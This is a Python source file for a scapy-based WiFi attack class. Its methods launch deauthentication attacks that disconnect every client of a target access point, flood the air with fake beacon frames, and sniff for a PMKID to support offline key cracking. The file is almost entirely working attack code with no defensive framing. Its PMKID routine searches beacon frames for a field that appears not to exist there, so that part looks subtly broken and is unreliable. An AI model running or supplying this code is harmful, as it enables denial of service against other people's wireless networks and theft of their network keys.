import time
import threading
import random
from scapy.all import *
from utils.logger import logger
from config.settings import config

class WiFiAttacker:
    def __init__(self):
        self.interface = config.get('network.interface', 'en0')
        self.running = False

    def set_interface(self, iface):
        self.interface = iface

    def deauth_attack(self, target_bssid, client_mac='FF:FF:FF:FF:FF:FF', count=100, burst=True):
        """
        Send deauthentication packets.
        client_mac = 'FF:FF:FF:FF:FF:FF' will disconnect all clients.
        """
        self.running = True
        logger.info(f"Launching deauth on {target_bssid}")
        pkt = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
        sent = 0
        while sent < count and self.running:
            sendp(pkt, iface=self.interface, verbose=False)
            sent += 1
            if burst and sent % 10 == 0:
                time.sleep(0.01)  # Tiny gap between bursts
        self.running = False
        logger.info(f"Deauth finished: {sent} packets sent")

    def beacon_flood(self, ssid_list=None, count=1000, interval=0.02):
        """Flood area with fake beacon frames"""
        self.running = True
        if ssid_list is None:
            ssid_list = [f"FREE_WIFI_{random.randint(0,9999)}" for _ in range(20)]
        logger.info(f"Beacon flood started with {len(ssid_list)} SSIDs")
        sent = 0
        while sent < count and self.running:
            for ssid in ssid_list:
                # Randomize MAC addresses to appear as multiple APs
                bssid = RandMAC()
                pkt = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                                         addr2=bssid, addr3=bssid) / Dot11Beacon(cap='ESS') / Dot11Elt(ID='SSID', info=ssid)
                sendp(pkt, iface=self.interface, verbose=False)
                sent += 1
                time.sleep(interval)
        self.running = False
        logger.info(f"Beacon flood done: {sent} beacons sent")

    def capture_pmkid(self, target_bssid, timeout=60):
        """Capture PMKID from RSN IE of target AP"""
        self.running = True
        logger.info(f"Capturing PMKID from {target_bssid} for {timeout}s")
        pmkid = None
        def packet_handler(pkt):
            nonlocal pmkid
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                if pkt[Dot11].addr3 == target_bssid:
                    if pkt.haslayer(Dot11EltRSN):
                        rsn = pkt[Dot11EltRSN]
                        # Search for PMKID in RSN IE
                        if hasattr(rsn, 'pmkid'):
                            pmkid = rsn.pmkid.hex()
                            logger.info(f"PMKID captured: {pmkid}")
                            return True
        sniff(iface=self.interface, prn=packet_handler, timeout=timeout, store=0, stop_filter=lambda x: pmkid is not None)
        self.running = False
        return pmkid

    def stop_all(self):
        self.running = False